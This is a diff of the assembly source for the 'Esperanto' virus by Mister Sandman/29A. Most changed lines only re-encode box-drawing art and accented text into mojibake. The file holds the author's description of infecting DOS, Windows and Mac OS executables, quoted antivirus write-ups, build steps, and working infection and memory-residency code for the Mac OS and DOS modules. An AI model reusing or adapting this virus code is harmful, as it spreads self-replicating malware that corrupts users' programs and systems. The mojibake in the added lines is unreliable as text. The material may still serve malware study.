@@ -1,12 +1,12 @@
 ;
-;   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
-;   ³        /\/\/\/\/ Esperanto \/\/\/\/\        ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
-;   ³        written by Mister Sandman/29A         ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
-;   ³  A MULTIPROCESSOR and MULTIPLATFORM virus   ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
-;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
+;   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„ â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„ â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„
+;   â”‚        /\/\/\/\/ Esperanto \/\/\/\/\        â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ
+;   â”‚        written by Mister Sandman/29A         â–„â–„â–„â–ˆâ–ˆâ–€ â–€â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
+;   â”‚  A MULTIPROCESSOR and MULTIPLATFORM virus   â–ˆâ–ˆâ–ˆâ–„â–„â–„â–„ â–„â–„â–„â–„â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ
+;   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–€ â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆ
 ;
 ; 0. Introduction
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; Welcome to Esperanto, world's first multiprocessor and multiplatform virus
 ; ever, which is (pretty obviously) my best virus so far. It took me several
 ; months to write it, assemble the whole thing, and put it together into one
@@ -17,7 +17,7 @@
 ;
 ;
 ; 1. Processors/platforms/objects
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; Esperanto is able to run in three different kinds of processors, which are
 ; Intel 80x86 (used in common PCs), Motorola 680x0 (used in old Apple Macin-
 ; tosh computers and in new Macintosh Performa) and PowerPC 6xx (used in new
@@ -41,24 +41,24 @@
 ; The following diagram is pretty useful to understand the above:
 ;
 ;
-;                   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄ DOS ÄÄÄÄÄÄ COM, EXE, NewEXE, PE
-;        ÚÄÄÄÄÄÄÄÄÄ³ Intel 80x86 ÃÄÄÄÅÄ Win 3.1x Ä COM, EXE, NewEXE, PE
-;        ³          ³    (PCs)    ³   ÀÄ Win32 ÄÄÄÄ COM, EXE, PE
-;        ³          ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
-;        ³         ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
-;  ÚÄÄÄÄÄÁÄÄÄÄÄ¿   ³ Motorola 680x0 ³
-;  ³ Esperanto ÃÄÄ³   (Old Macs)   ÃÄ¿            ÚÄ Mac OS Apps
-;  ÀÄÄÄÄÄÂÄÄÄÄÄÙ   ³ (Mac Performa) ³ ³            ÃÄ System File
-;        ³         ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ ÃÄ Mac OS ÄÄÅÄ Mac OS Finder
-;        ³          ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿  ³            ÃÄ DA Handler
-;        ³          ³ PowerPC 6xx  ³  ³            ÀÄ Desktop File
-;        ÀÄÄÄÄÄÄÄÄÄ³ (Power Macs) ÃÄÄÙ                (Mac OS <7)
-;                   ³ (PowerBooks) ³
-;                   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+;                   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€  DOS â”€â”€â”€â”€â”€â”€  COM, EXE, NewEXE, PE
+;        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ Intel 80x86 â”œâ”€â”€â”€â”¼â”€  Win 3.1x â”€  COM, EXE, NewEXE, PE
+;        â”‚          â”‚    (PCs)    â”‚   â””â”€  Win32 â”€â”€â”€â”€  COM, EXE, PE
+;        â”‚          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
+;        â”‚         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+;  â”Œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”   â”‚ Motorola 680x0 â”‚
+;  â”‚ Esperanto â”œâ”€â”€ â”‚   (Old Macs)   â”œâ”€â”            â”Œâ”€  Mac OS Apps
+;  â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜   â”‚ (Mac Performa) â”‚ â”‚            â”œâ”€  System File
+;        â”‚         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”œâ”€  Mac OS â”€â”€â”¼â”€  Mac OS Finder
+;        â”‚          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚            â”œâ”€  DA Handler
+;        â”‚          â”‚ PowerPC 6xx  â”‚  â”‚            â””â”€  Desktop File
+;        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ (Power Macs) â”œâ”€â”€â”˜                (Mac OS <7)
+;                   â”‚ (PowerBooks) â”‚
+;                   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 ;
 ;
 ; 2.0. Internal structure
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; Esperanto gets the compatibility  and the  portability between these three
 ; different processors by means of the strategyc  use of its internal struc-
 ; ture, so it's completely necessary to see what does it consist on in order
@@ -146,34 +146,34 @@
 ; Again, the use of a diagram will make things much simpler to understand:
 ;
 ;
-;          ÚÄÄÄÄÄÄ¿
-;        ÚÄÅÄÄÄÄÄÄÅÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÄÄ Universal entry point
-;        ³ ÀÄÄÄÄÄ³ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÃÄÄ Mac OS entry point
-;        ³        ³ÛÛÛÛ Mac OS ÛÛÛÛ³
-;        ³        ³ÛÛÛÛ module ÛÛÛÛ³
-;        ³        ³ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ³
-;        ÀÄÄÄÄÄÄÄ³±±±±±±±±±±±±±±±±ÃÄÄ COM/EXE entry point
-;                 ³±± DOS module ±±³
-;                 ³±±(not memres)±±³
-;          ÚÄÄÄÄÄÄ´±±±±±±±±±±±±±±±±³
-;        ÚÄÅÄÄÄÄÄÄ´°°°°°°°°°°°°°°°°ÃÄÄ NewEXE entry point
-;        ³ ³      ³°° Win module °°³
-;        ³ ³      ³°°°°°°°°°°°°°°°°³
-;        ³ ÀÄÄÄÄÄ³±±±±±±±±±±±±±±±±ÃÄÄ DOS memory resident code
-;        ÀÄÄÄÄÄÄÄ³±± DOS module ±±ÃÄÄ 16-bit infection routines
-;                 ³±±(memory res)±±³
-;                 ³±±±±±±±±±±±±±±±±³
-;                 ³²²²²²²²²²²²²²²²²ÃÄÄ PE entry point
-;                 ³²² W32 module ²²³
-;                 ³²²²²²²²²²²²²²²²²³
-;                 ³++++++++++++++++ÃÄÄ Data buffer
-;                 ³+++++ Data +++++³
-;                 ³++++++++++++++++³
-;                 ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+;          â”Œâ”€â”€â”€â”€â”€â”€â”
+;        â”Œâ”€â”¼â”€â”€â”€â”€â”€â”€â”¼â”¬â”¬â”¬â”¬â”¬â”¬â”¬â”¬â”¬â”¬â”¬â”¬â”¬â”¬â”¬â”¬â”¬â”€â”€  Universal entry point
+;        â”‚ â””â”€â”€â”€â”€â”€ â”‚â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”œâ”€â”€  Mac OS entry point
+;        â”‚        â”‚â–ˆâ–ˆâ–ˆâ–ˆ Mac OS â–ˆâ–ˆâ–ˆâ–ˆâ”‚
+;        â”‚        â”‚â–ˆâ–ˆâ–ˆâ–ˆ module â–ˆâ–ˆâ–ˆâ–ˆâ”‚
+;        â”‚        â”‚â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ”‚
+;        â””â”€â”€â”€â”€â”€â”€â”€ â”‚â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â”œâ”€â”€  COM/EXE entry point
+;                 â”‚â–’â–’ DOS module â–’â–’â”‚
+;                 â”‚â–’â–’(not memres)â–’â–’â”‚
+;          â”Œâ”€â”€â”€â”€â”€â”€â”¤â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â”‚
+;        â”Œâ”€â”¼â”€â”€â”€â”€â”€â”€â”¤â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â”œâ”€â”€  NewEXE entry point
+;        â”‚ â”‚      â”‚â–‘â–‘ Win module â–‘â–‘â”‚
+;        â”‚ â”‚      â”‚â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â”‚
+;        â”‚ â””â”€â”€â”€â”€â”€ â”‚â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â”œâ”€â”€  DOS memory resident code
+;        â””â”€â”€â”€â”€â”€â”€â”€ â”‚â–’â–’ DOS module â–’â–’â”œâ”€â”€  16-bit infection routines
+;                 â”‚â–’â–’(memory res)â–’â–’â”‚
+;                 â”‚â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â”‚
+;                 â”‚â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â”œâ”€â”€  PE entry point
+;                 â”‚â–“â–“ W32 module â–“â–“â”‚
+;                 â”‚â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â”‚
+;                 â”‚++++++++++++++++â”œâ”€â”€  Data buffer
+;                 â”‚+++++ Data +++++â”‚
+;                 â”‚++++++++++++++++â”‚
+;                 â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 ;
 ;
 ; 2.1. The Mac OS module
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; This module (Motorola-opcoded) was written and compiled in a Mac computer.
 ; It has the format of a MDEF resource. It's executed every time an infected
 ; application is run under Mac OS. When this happens the module will perform
@@ -197,7 +197,7 @@
 ;
 ;
 ; 2.2.0. The DOS module
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; This module uses 16-bit Intel code, and  was specifically  designed to run
 ; in DOS. It has the peculiarity of being divided into two different chunks,
 ; each of them  with a different mission. Now i'll try to describe the func-
@@ -205,7 +205,7 @@
 ;
 ;
 ; 2.2.1. The DOS runtime module
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; This submodule is executed every time  an infected COM or EXE file is run.
 ; When this happens, the DOS runtime module will try to perform two actions:
 ; first, become memory resident by hooking interrupt 21h; and second, resto-
@@ -214,14 +214,14 @@
 ; The residency method is completely standard, as the virus first checks for
 ; its presence in memory (in order to not to go resident twice), and if this
 ; is ok  then creates a new MCB, sets it as a system one used by DOS, copies
-; its code into it and then jumps to this copy, so no ëelta-offset is longer
+; its code into it and then jumps to this copy, so no Î´elta-offset is longer
 ; needed. Once this happens it will hook interrupt 21h, setting the new vec-
 ; tor to the start of  the DOS memory resident  module, and  then will check
 ; for the file format of its host, in order to rebuild and jump to it.
 ;
 ;
 ; 2.2.2. The DOS memory resident module
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; This submodule is executed every time the interrupt 21h is called once the
 ; virus has previously gone memory resident. Esperanto intercepts only three
 ; functions: its own interrupt service (a ":)" smiley), the findfirst servi-
@@ -244,7 +244,7 @@
 ;
 ;
 ; The 16-bit infection routines
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; For the case the latter didn't happen, Esperanto is about to check the fi-
 ; le in DS:DX in order to know if it is worth to be infected or not. But be-
 ; fore doing any specific file check (which would depend  on its extension),
@@ -301,7 +301,7 @@
 ;
 ;
 ; 2.3. The Windows 3.1x module
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; This module is executed every time an infected NewEXE file is run. It will
 ; first of all get an alias selector for CS and point it with DS. As soon as
 ; this is done it will use its own runtime routines in order to look for so-
@@ -313,7 +313,7 @@
 ;
 ;
 ; 2.4. The Win32 module
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; This last module is executed every time an infected PE file is run. It was
 ; written and compiled in 32-bit protected mode, and that is what it is able
 ; to work in: Win32 platforms (Win32s/Windows95/WindowsNT). When it's execu-
@@ -347,7 +347,7 @@
 ;
 ;
 ; 2.5. Union makes the power
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; It's not about the fact that this virus has been written to be in the wild
 ; or shit like that. In fact i did not take care about restoring file attri-
 ; butes, date or time, because i wrote this just to "prove my point", not to
@@ -386,7 +386,7 @@
 ;
 ;
 ; 3. Payload
-; ÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; This virus took its name after the universal language Esperanto. This lan-
 ; guage was invented in 1887 by L.L.Zamenhof, a polish doctor. Esperanto was
 ; designed to be the second language of everyone, and then was invented with
@@ -432,14 +432,14 @@
 ;
 ;
 ; 4.0 The "other side"
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; It has only passed one week after having sent the virus to two AVers. This
 ; is what we could get from them by the moment. Further reports and analyses
 ; will be referenced in the next issue of 29A.
 ;
 ;
-; 4.1. Mikko Hypp”nen speaks (F-Prot)
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; 4.1. Mikko HyppÃ¶nen speaks (F-Prot)
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; (*) http://www.DataFellows.com/v-descs/esperant.htm
 ;
 ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
@@ -509,12 +509,12 @@
 ;
 ;
 ; 4.2. Eugene Kaspersky speaks (AVP)
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; (*) http://www.avp.ch/avpve/file/e/esperant.stm
 ;
 ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
 ; Esperanto.4733
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; This is a multiplatform parasitic virus. It infects DOS COM and EXE,
 ; Windows EXE (NE) and Windows32 EXE (PE) files. It also has a part of
 ; code that looks like a MDEF Macintosh resource and seems to be also a
@@ -565,7 +565,7 @@
 ;
 ;
 ; 4.3 Keith Peer speaks (AVP)
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; (*) alt.comp.virus
 ;
 ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
@@ -630,7 +630,7 @@
 ;
 ;
 ; 4.4. Guillermito speaks ;)
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; (*) alt.comp.virus
 ;
 ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
@@ -657,8 +657,8 @@
 ; http://www.pipo.com/guillermito/darkweb/virus.html
 ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
 ;
-; My reply: lo tuyo s¡ que se sale... ;) Espero verte de nuevo en la pr¢xima
-; reuni¢n de 29A este verano, a ver si esta vez no te pierdes en Madrid ;)
+; My reply: lo tuyo sÃ­ que se sale... ;) Espero verte de nuevo en la prÃ³xima
+; reuniÃ³n de 29A este verano, a ver si esta vez no te pierdes en Madrid ;)
 ;
 ; Btw, the guys at AVP don't seem to have understood very well the way Espe-
 ; ranto jumps from a PC to a Macintosh computer. I would also like to make a
@@ -681,7 +681,7 @@
 ;
 ;
 ; 5. Greetings
-; ÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; I would like to thank Jacky Qwerty very especially for his big help in the
 ; Win32 module (as well as in some stupid bugs) :) I wouldn't have been able
 ; to write the Win32 module without him. What can i say man... thank you ve-
@@ -697,7 +697,7 @@
 ;
 ;
 ; 6. Compiling it
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ; Don't even think on trying to compile the source code below. To do it, you
 ; should first separate three of the four modules, compile each of them with
 ; a different mode and/or compiler, and then put again the whole stuff toge-
@@ -710,13 +710,13 @@
 ; was CodeWarrior (i had to insert the ASM code inside a C source).
 ;
 ;
-;  DOS+Windows 3.1x modules
+;   DOS+Windows 3.1x modules
 ;
 ; tasm /m espodos.asm
 ; tlink espodos.obj
 ; exe2bin espodos.exe espodos.com
 ;
-;  Win32 module
+;   Win32 module
 ;
 ; tasm32 -ml -m5 -q -zn espow32.asm
 ; tlink32 -Tpe -c -x -aa espow32.obj,,, import32.lib
@@ -727,7 +727,7 @@
                 .code
                  org    0
 
-; ÍÍ¹ Absolute virus start ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+; â•â•â•£ Absolute virus start â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
                 .386                                ; Intel 80386 real mode
 espo_start      label   byte                        ; Define virus start
@@ -738,9 +738,9 @@ dseta_offset    equ     dseta_byte-espow32_start    ; Dseta-offset size
 text_size       equ     text_end-text_start         ; Size of payload text
 base_default    equ     400000h                     ; Base default address
 
-; ÄÄ´ Universal entry ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Universal entry â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ;
-;  Note: this is the entry point for infected COM, EXE and Mac OS files. If
+;   Note: this is the entry point for infected COM, EXE and Mac OS files. If
 ;   the following instruction is executed in an Intel processor, it will jmp
 ;   to the real entry for COM and EXE files. Otherwise (when running under a
 ;   Motorola or PowerPC processor) it will be interpreted and executed as if
@@ -749,7 +749,7 @@ base_default    equ     400000h                     ; Base default address
 
 com_exe_entry:  jmp     real_ce_entry               ; Jumps only in PCs
 
-; ÍÍ¹ Mac OS module ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+; â•â•â•£ Mac OS module â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 espo_header:    bra.s   mac_os_entry                ; Jump to virus code
                 dc.w    #$0                         ; Header gaps for later
@@ -757,7 +757,7 @@ espo_header:    bra.s   mac_os_entry                ; Jump to virus code
                 dc.l    #$0                         ; jump table built by
                 dc.l    #$0                         ; the Mac OS Finder
 
-; ÄÄ´ Entry point for Mac OS applications ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Entry point for Mac OS applications â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 mac_os_entry:   lea     espo_header,a0              ; Copy our code location
                 move.l  a0,$9ce                     ; to $9ce (ToolScratch)
@@ -765,7 +765,7 @@ mac_os_entry:   lea     espo_header,a0              ; Copy our code location
 
 espo_body:      link    a6,#-$24                    ; Link code address
                 movem.l d4-d7/a2-a4,-(sp)           ; Push in our registers
-                move.l  $14(a6),d5                  ; Use d5 as ëelta-offset
+                move.l  $14(a6),d5                  ; Use d5 as Î´elta-offset
 
                 movea.l #$a25,a3                    ; In $a25 (MenuFlash),
                 move.b  (a3),d0                     ; look for our action
@@ -839,7 +839,7 @@ search_loop:    addq.l  #$1,d6                      ; and to limit too fast
                 cmpi.l  #$30d40,d6                  ; infection, as WDEF is
                 ble     check_offset                ; a less called resource
 
-; ÄÄ´ Mac OS applications infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Mac OS applications infection routine â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 infect_mac_os:  subq.w  #$4,sp                      ; Empty stack (4 bytes)
                 move.l  #'CODE',-(sp)               ; Push the resource name
@@ -915,7 +915,7 @@ infect_mac_os:  subq.w  #$4,sp                      ; Empty stack (4 bytes)
                 _UseResFile                         ; resource (addr.in d7)
                 bra     calc_new_size               ; Calculate new size
 
-new_mdef:       movea.l d5,a0                       ; Move ëelta to a0
+new_mdef:       movea.l d5,a0                       ; Move Î´elta to a0
                 move.l  (a0),a0                     ; Move 1st byte to a0
                 move.l  a4,$6(a0)                   ; Move address for MDEF
                 clr.w   -(sp)                       ; to a0+$6 and call
@@ -988,15 +988,15 @@ calc_new_size:  move.l  d5,-(sp)                    ; Move delta into stack
                 dc.w    #$2020                      ; Pre-initialized gaps
                 dc.w    #$2020                      ; for Mac OS Finder
 
-; ÄÄ´ Data area for Mac OS module ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; â”€â”€â”¤ Data area for Mac OS module â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 first_tab:      dc.w    #$16                        ; For _GetNamedResource
 second_tab:     dc.b    #$7                         ; For _AddResource
 name_only:      dc.l    #'Esperanto'                ; For _SetResInfo
 
-; ÍÍ¹ DOS runtime module ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+; â•â•â•£ DOS runtime module â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-real_ce_entry:  call    delta_offset                ; Get ë-offset in BP in
+real_ce_entry:  call    delta_offset                ; Get Î´-offset in BP in
 delta_offset:   pop     bp                          ; the traditional and
                 sub     bp,offset delta_offset      ; always effective way :)
                 push    es cs                       ; Segment push/popping
@@ -1038,7 +1038,7 @@ go_mem_res:     mov     ax,es                       ; Residency routine
 
                 push    es                          ; Now jump to our copy
                 push    offset copy_vector          ; in memory so we don't
-                retf                                ; have to use ë-offset
+                retf                                ; have to use Î´-offset
 
 copy_vector:    push    ds                          ; Save DS in the stack
                 mov     ds,cx                       ; DS = CX = 0 -> IVT
@@ -1086,7 +1086,7 @@ restore_com:    lea     si,[bp+old_com_header]      ; Point to the buffer
                 movsb                               ; to its entrypoint
                 retf                                ; Jump to CS:IP
 
-; ÍÍ¹ Windows 3.1x module ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
